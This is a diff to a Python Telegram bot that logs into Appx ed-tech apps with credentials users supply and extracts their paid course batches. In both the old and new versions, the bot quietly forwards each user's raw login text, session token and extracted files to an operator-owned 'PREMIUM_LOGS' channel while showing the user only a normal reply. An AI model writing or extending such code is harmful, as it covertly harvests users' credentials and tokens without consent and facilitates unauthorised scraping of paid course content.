@@ -15,17 +15,10 @@ from base64 import b64decode
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor
 import time 
-from config import PREMIUM_LOGS, join
-from datetime import datetime
-import pytz
-import config 
+from config import PREMIUM_LOGS
 
-join = config.join
-india_timezone = pytz.timezone('Asia/Kolkata')
-current_time = datetime.now(india_timezone)
-time_new = current_time.strftime("%d-%m-%Y %I:%M %p")
-
-
+log_channel = PREMIUM_LOGS
+log_channel2 = PREMIUM_LOGS
 
 def decrypt(enc):
     enc = b64decode(enc.split(':')[0])
@@ -315,8 +308,8 @@ async def appex_v3_txt(app, message, api, name):
 
     dl = (f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for {app_name} \n {api_base}\n\n `{raw_text}` \n\n`{token}`\n{FFF}")
     if len(FFF) <= 4096:
-        await app.send_message(PREMIUM_LOGS, dl)
-        await app.send_message(PREMIUM_LOGS, f"`{token}`")
+        await app.send_message(log_channel, dl)
+        await app.send_message(log_channel2, f"`{token}`")
         editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅\n\n`{token}`\n{FFF}")      
     else:
         plain_FFF = FFF.replace("**", "").replace("`", "")
@@ -329,7 +322,7 @@ async def appex_v3_txt(app, message, api, name):
             document=file_path,
             caption="Too many batches, so select batch IDs from the text file."
         )
-        await app.send_document(PREMIUM_LOGS, document=file_path, caption="Too many batches.")
+        await app.send_document(log_channel, document=file_path, caption="Too many batches.")
     
         editable1 = None
 
@@ -405,36 +398,28 @@ async def appex_v3_txt(app, message, api, name):
                         print(f"An error occurred while processing the course: {str(e)}")
                         await message.reply_text("An error occurred while processing the course. Please try again later.")
                         continue
-                        
-                
+                    
                 end_time = time.time()
                 elapsed_time = end_time - start_time
                 print(f"Elapsed time: {elapsed_time:.1f} seconds")
                 np = filename1
-                caption = (
-                    f"࿇ ══━━ 🏦 ━━══ ࿇\n\n"
-                    f"🌀 APP NAME : {app_name}\n"
-                    f"============================\n\n"
-                    f"🎯 BATCH NAME : {raw_text2}_{txtn}\n"
-                    f"🌟 COURSE THUMBNAIL : {cp}\n\n"
-                    f"🌐 JOIN US : {join}\n"
-                    f"⌛ TIME TAKEN : {elapsed_time:.1f} seconds\n\n"
-                    f"❄️ DATE : {time_new}"
-                )#  c_text = (
-                  #  f"**APP NAME: <b>{app_name}</b>**\n"
-                  #  f"**BatchName:** {raw_text2}_{txtn}\n"
-             #       f"**Validity Start:**{start}\n"
-                    #f"**Validity Ends:**{end}\n"
-              #      f"Elapsed time: {elapsed_time:.1f} seconds\n"
-              #      f"**Batch Price:** {pricing}\n"
-              #      f"**course_thumbnail:** <a href={cp}>Thumbnail</a>" )
+            
+                c_text = (
+                    f"**APP NAME: <b>{app_name}</b>**\n"
+                    f"**BatchName:** {raw_text2}_{txtn}\n"
+                    f"**Validity Start:**{start}\n"
+                    f"**Validity Ends:**{end}\n"
+                    f"Elapsed time: {elapsed_time:.1f} seconds\n"
+                    f"**Batch Price:** {pricing}\n"
+                    f"**course_thumbnail:** <a href={cp}>Thumbnail</a>"
+                )
             
                 try:
                     await input2.delete(True)
                     await m1.delete(True)
                     await m2.delete(True)
-                    await app.send_document(message.chat.id, filename1, caption=caption)
-                    await app.send_document(PREMIUM_LOGS, filename1, caption=caption)
+                    await app.send_document(message.chat.id, filename1, caption=c_text)
+                    await app.send_document(log_channel, filename1, caption=c_text)
                     
             
                 except Exception as e:
@@ -446,6 +431,3 @@ async def appex_v3_txt(app, message, api, name):
                 finally:
                     if os.path.exists(filename1):
                         os.remove(filename1)
-
-
-
